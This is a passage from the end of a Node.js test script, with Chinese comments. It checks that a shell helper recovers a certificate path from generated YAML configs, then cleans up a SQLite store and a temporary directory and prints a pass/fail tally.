  const cfg = path.join(probeDir, 'cfg.yaml');
  fs.writeFileSync(cfg, `listen: :24578\n${line}\n`);
  const r = spawnSync('sh', ['-c', pickScript, 'sh', cfg], { encoding: 'utf8' });
  const out = String(r.stdout || '');
  ok(`hy_ensure 能从${label}的 yaml 里还原出证书路径`, out === probeCert, JSON.stringify(out));
}

/* ------------------------------ 收尾 ------------------------------ */
// 先关库再删目录：Windows 上 SQLite 句柄没释放时 unlink 会 EBUSY
try {
  require('../lib/store').close();
} catch {
  /* 已经关了 */
}
try {
  fs.rmSync(TMP, { recursive: true, force: true });
} catch {
  /* 临时目录清不掉不影响测试结论，交给系统回收 */
}
console.log(`\n${fail ? '✗ ' + fail + ' 项失败' : '全部通过'}（共 ${pass + fail} 项）`);
process.exit(fail ? 1 : 0);
